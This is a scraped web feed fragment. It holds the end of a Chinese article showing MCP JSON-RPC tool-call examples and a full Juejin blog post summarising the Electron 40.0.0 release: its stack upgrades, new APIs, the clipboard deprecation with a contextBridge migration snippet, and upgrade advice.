            <span class="hljs-attr">"b"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span><span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"number"</span><span class="hljs-punctuation">}</span>
          <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
          <span class="hljs-attr">"required"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"a"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"b"</span><span class="hljs-punctuation">]</span>
        <span class="hljs-punctuation">}</span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">]</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>

<span class="hljs-comment">// 工具调用请求</span>
<span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"jsonrpc"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"2.0"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"2"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"method"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"tools/call"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"params"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"add"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"arguments"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span><span class="hljs-attr">"a"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">5</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"b"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">3</span><span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>

<span class="hljs-comment">// 工具调用响应</span>
<span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"jsonrpc"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"2.0"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"2"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"result"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"content"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
      <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"text"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"text"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"5 + 3 = 8"</span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">]</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h2 data-id="heading-14">四、结尾</h2>
<p>因此有了对这三者的核心概念的了解，其实对大模型应用开发也有了比较深入的认识了。</p>
<p>评论区欢迎讨论。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[啊？我刚把 Electron 版本升级到39，现在40又来了❓❓❓]]></title>    <link>https://juejin.cn/post/7596983314805882930</link>    <guid>https://juejin.cn/post/7596983314805882930</guid>    <pubDate>2026-01-20T01:39:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596983314805882930" data-draft-id="7596906473307275314" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="啊？我刚把 Electron 版本升级到39，现在40又来了❓❓❓"/> <meta itemprop="keywords" content="前端,后端,JavaScript"/> <meta itemprop="datePublished" content="2026-01-20T01:39:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Moment"/> <meta itemprop="url" content="https://juejin.cn/user/3782764966460398"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            啊？我刚把 Electron 版本升级到39，现在40又来了❓❓❓
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3782764966460398/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Moment
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T01:39:59.000Z" title="Tue Jan 20 2026 01:39:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读11分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"「";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"」";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"✓";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-dark">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#abb2bf;background:#282c34}.hljs-comment,.hljs-quote{color:#5c6370;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#c678dd}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e06c75}.hljs-literal{color:#56b6c2}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#98c379}.hljs-built_in,.hljs-class .hljs-title{color:#e6c07b}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#d19a66}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#61aeee}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><blockquote>
<p>我正在开发 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fxun082%2FDocFlow" target="_blank" title="https://github.com/xun082/DocFlow" ref="nofollow noopener noreferrer">DocFlow</a>，它是一个完整的 AI 全栈协同文档平台。该项目融合了多个技术栈，包括基于 <code>Tiptap</code> 的富文本编辑器、<code>NestJs</code> 后端服务、<code>AI</code> 集成功能和实时协作。在开发过程中，我积累了丰富的实战经验，涵盖了 <code>Tiptap</code> 的深度定制、性能优化和协作功能的实现等核心难点。</p>
</blockquote>
<p>如果你对 AI 全栈开发、Tiptap 富文本编辑器定制或 DocFlow 项目的完整技术方案感兴趣，欢迎加我微信 <code>yunmz777</code> 进行私聊咨询，获取详细的技术分享和最佳实践。</p>
<p>就在 2025 年 10 月 28 日，Electron 团队刚刚发布了 Electron 39.0.0 版本，带来了 ASAR Integrity 功能的稳定化、Chromium 142 的升级以及一系列新特性。许多开发者还在熟悉 39 版本的功能和特性，特别是 ASAR Integrity 这个从实验性功能转为稳定版的重要安全特性。</p>
<p>然而，仅仅过了大约两个半月，Electron 团队就在 2026 年 1 月 13 日再次发布了 Electron 40.0.0 版本！这个发布节奏确实体现了 Electron 团队在技术迭代上的高效和积极。从 39 版本到 40 版本，不仅核心技术栈有了重大升级，还引入了一些新的功能和改进，同时也有一些需要开发者注意的破坏性变更。</p>
<h2 data-id="heading-0">核心技术栈升级</h2>
<p>Electron 40.0.0 的核心技术栈进行了重大升级：</p>
<ul>
<li>Chromium：从 142.0.7444.52 升级到 144.0.7559.60</li>
<li>Node.js：从 v22.20.0 升级到 v24.11.1</li>
<li>V8 引擎：从 14.2 升级到 14.4</li>
</ul>
<p>这些升级意味着 Electron 应用将获得更好的性能、安全性和对新 Web 标准的支持。特别值得注意的是，Node.js 从 22 版本直接跳到了 24 版本，这是一个重大升级，带来了更多现代化的 JavaScript 特性和性能优化。Chromium 144 的升级也带来了最新的浏览器特性、安全补丁和性能改进。</p>
<p>对比 Electron 39 版本（Chromium 142、Node.js 22.20.0、V8 14.2），40 版本在技术栈上有了明显的进步，特别是在 Node.js 版本上的跨越式升级。</p>
<h2 data-id="heading-1">新功能和改进</h2>
<h3 data-id="heading-2">硬件加速检测能力</h3>
<p>新增了 <code>app.isHardwareAccelerationEnabled()</code> 方法，允许开发者检测硬件加速是否已启用。这个功能在 Electron 39 中就已经引入，在 40 版本中继续可用。这对于需要了解应用运行环境的场景非常有用，可以帮助开发者更好地优化应用性能，特别是在处理图形密集型任务时。</p>
<h3 data-id="heading-3">高动态范围（HDR）支持</h3>
<p>在离屏渲染（Offscreen Rendering）中新增了 RGBAF16 输出格式，支持 scRGB HDR 色彩空间。这个功能同样在 Electron 39 中就已经引入，在 40 版本中继续完善。这对于需要处理高动态范围内容的媒体应用来说是一个重要的改进，能够提供更丰富的视觉体验，让应用能够更好地展示高质量的视频和图像内容。</p>
<h3 data-id="heading-4">Linux 系统主题色支持</h3>
<p>在 Linux 平台上新增了通过 <code>systemPreferences.getAccentColor</code> 获取系统强调色的能力。这个功能在 Electron 39 中就已经引入，在 40 版本中继续可用。这使得 Electron 应用能够更好地与系统主题集成，提供更一致的用户体验。这个功能在 macOS 和 Windows 上已经存在，现在 Linux 用户也能享受到同样的体验。</p>
<h3 data-id="heading-5">文件系统 API 权限持久化</h3>
<p>现在可以在会话中持久化 File System API 的授权状态。这个功能在 Electron 37、38、39 版本中就已经引入，在 40 版本中继续完善。这意味着用户授予的文件访问权限可以在应用重启后保持，减少了重复授权的麻烦，提升了用户体验。这对于需要频繁访问文件系统的应用来说是一个很实用的改进。</p>
<h3 data-id="heading-6">开发者工具自动聚焦</h3>
<p>当检查元素或触发断点时，开发者工具会自动聚焦。这个功能在 Electron 37、38、39 版本中就已经引入，在 40 版本中继续可用。这个小改进可以显著提升开发体验，让调试过程更加流畅，特别是在使用多个窗口进行开发时。</p>
<h3 data-id="heading-7">动态 ESM 导入支持</h3>
<p>在非上下文隔离的预加载脚本中支持动态 ESM 导入。这个功能在 Electron 37、38、39 版本中就已经引入，在 40 版本中继续可用。这为开发者提供了更灵活的模块加载方式，特别是在需要条件加载模块的场景中，可以让代码组织更加灵活。</p>
<h3 data-id="heading-8">SF Symbol 支持</h3>
<p>更新了 <code>nativeImage.createFromNamedImage</code> 以支持 SF Symbol 名称。这个功能在 Electron 39 中就已经引入，在 40 版本中继续完善。SF Symbol 是 macOS 和 iOS 上的系统图标集，这个改进让 Electron 应用能够更好地使用系统原生图标，提供更原生的视觉体验。</p>
<h3 data-id="heading-9">视频帧导入支持</h3>
<p>新增了将外部共享纹理导入为 VideoFrame 的支持。这是 Electron 40 版本的新功能。这对于需要处理视频内容的媒体应用来说是一个重要的功能增强，可以更好地处理视频流和图像数据。</p>
<h3 data-id="heading-10">内存回收机制改进</h3>
<p>新增了 "memory-eviction" 作为子进程退出的可能原因。这是 Electron 40 版本的新功能。这有助于开发者更好地诊断和理解应用的内存管理问题，特别是在处理内存压力时能够更准确地定位问题。</p>
<h3 data-id="heading-11">网络请求协议处理增强</h3>
<p>在 <code>net.request</code> 中新增了 <code>bypassCustomProtocolHandlers</code> 选项，提供了更细粒度的协议处理控制。这个功能在 Electron 38、39 版本中就已经引入，在 40 版本中继续可用。这让开发者可以更精确地控制网络请求的行为，特别是在处理自定义协议时。</p>
<h3 data-id="heading-12">无障碍功能增强</h3>
<p>新增了更细粒度的无障碍支持管理方法，帮助开发者更好地实现应用的无障碍功能。这个功能在 Electron 37、38、39 版本中就已经引入，在 40 版本中继续完善。这对于需要满足无障碍标准的应用来说是一个重要的改进。</p>
<h3 data-id="heading-13">强调色重置功能</h3>
<p>现在可以通过 <code>window.setAccentColor(null)</code> 将强调色重置为跟随系统设置，提供了更灵活的主题控制。这个功能在 Electron 38、39 版本中就已经引入，在 40 版本中继续可用。这让应用可以更好地响应用户的系统主题变化。</p>
<h2 data-id="heading-14">破坏性变更</h2>
<h3 data-id="heading-15">剪贴板 API 访问变更（已弃用）</h3>
<p>重要变更：在渲染进程中直接使用剪贴板 API 已被弃用。如果需要在渲染进程中调用剪贴板 API，应该将 API 调用放在预加载脚本中，并使用 <code>contextBridge</code> API 暴露给渲染进程。</p>
<p>这是一个安全相关的变更，建议开发者尽快迁移代码：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ❌ 不推荐：在渲染进程中直接使用</span>
navigator.<span class="hljs-property">clipboard</span>.<span class="hljs-title function_">writeText</span>(<span class="hljs-string">'text'</span>);

<span class="hljs-comment">// ✅ 推荐：在预加载脚本中使用 contextBridge</span>
<span class="hljs-comment">// preload.js</span>
<span class="hljs-keyword">const</span> { contextBridge, clipboard } = <span class="hljs-built_in">require</span>(<span class="hljs-string">'electron'</span>);
contextBridge.<span class="hljs-title function_">exposeInMainWorld</span>(<span class="hljs-string">'electronAPI'</span>, {
  <span class="hljs-attr">writeText</span>: <span class="hljs-function">(<span class="hljs-params">text</span>) =&gt;</span> clipboard.<span class="hljs-title function_">writeText</span>(text)
});

<span class="hljs-comment">// renderer.js</span>
<span class="hljs-variable language_">window</span>.<span class="hljs-property">electronAPI</span>.<span class="hljs-title function_">writeText</span>(<span class="hljs-string">'text'</span>);
</code></pre>
<p>这个变更的目的是提高应用的安全性，通过 contextBridge 可以更好地控制渲染进程和主进程之间的通信，减少潜在的安全风险。这与 Electron 39 版本中 ASAR Integrity 稳定化的安全导向是一致的。</p>
<h3 data-id="heading-16">macOS dSYM 文件压缩格式变更</h3>
<p>macOS 的调试符号（dSYM）文件现在使用 xz 压缩格式，以处理更大的文件大小。dsym.zip 文件现在变成了 dsym.tar.xz 文件。使用调试符号的开发者可能需要更新他们的解压工具以支持 xz 格式。</p>
<p>这个变更主要是为了处理越来越大的调试符号文件，xz 压缩格式提供了更好的压缩率，但需要开发者更新工具链。</p>
<h2 data-id="heading-17">与 Electron 39 版本的对比</h2>
<p>Electron 40 版本相比 39 版本的主要变化：</p>
<ol>
<li>
<p>技术栈升级：Chromium 从 142 升级到 144，Node.js 从 22.20.0 升级到 24.11.1，V8 从 14.2 升级到 14.4</p>
</li>
<li>
<p>新功能：新增了视频帧导入支持和内存回收机制改进等新功能</p>
</li>
<li>
<p>功能延续：许多在 39 版本中引入的功能在 40 版本中继续可用和完善，如硬件加速检测、HDR 支持、Linux 主题色支持等</p>
</li>
<li>
<p>破坏性变更：新增了剪贴板 API 访问的弃用警告，这是 40 版本特有的变更</p>
</li>
<li>
<p>安全改进：延续了 39 版本中 ASAR Integrity 稳定化的安全导向，进一步强化了应用安全性</p>
</li>
</ol>
<h2 data-id="heading-18">版本支持情况</h2>
<p>根据 Electron 的支持策略，Electron 37.x.y 已经到达支持结束（End-of-Support）。开发者和应用应该尽快升级到更新的版本。</p>
<p>当前支持的版本矩阵：</p>

























<table><thead><tr><th>E40 (Jan'26)</th><th>E41 (Mar'26)</th><th>E42 (May'26)</th></tr></thead><tbody><tr><td>40.x.y</td><td>41.x.y</td><td>42.x.y</td></tr><tr><td>39.x.y</td><td>40.x.y</td><td>41.x.y</td></tr><tr><td>38.x.y</td><td>39.x.y</td><td>40.x.y</td></tr></tbody></table>
<p>对比 Electron 39 版本发布时的支持矩阵（E39、E40、E41），可以看到版本支持策略保持稳定，Electron 团队通常同时维护三个主要版本，每个版本大约支持 6 个月。这意味着开发者需要保持相对频繁的升级节奏，以确保应用的安全性和兼容性。</p>
<h2 data-id="heading-19">升级建议</h2>
<p>对于正在使用 Electron 的开发者，建议：</p>
<ol>
<li>
<p>及时升级：如果使用的是 Electron 37 或更早版本，应该尽快升级到 Electron 40。Electron 37 已经到达支持结束，不再接收安全更新。如果正在使用 Electron 39，也可以考虑升级到 40 版本以获得最新的技术栈升级。</p>
</li>
<li>
<p>检查破坏性变更：特别注意剪贴板 API 的使用，需要迁移到预加载脚本模式。这个变更虽然需要一些代码调整，但对于应用的安全性是有益的。</p>
</li>
<li>
<p>充分利用新功能：如果应用涉及视频处理，可以利用新的视频帧导入支持。如果需要更好的内存管理，可以利用新的内存回收机制改进。</p>
</li>
<li>
<p>充分测试应用：升级后充分测试应用功能，特别是涉及文件系统、网络请求和主题相关的功能。新版本可能带来一些行为变化，需要仔细验证。</p>
</li>
<li>
<p>关注版本发布节奏：从 39 版本到 40 版本的发布间隔来看，Electron 团队保持了稳定的发布节奏。开发者应该建立更灵活的升级和测试流程，以适应这种节奏。</p>
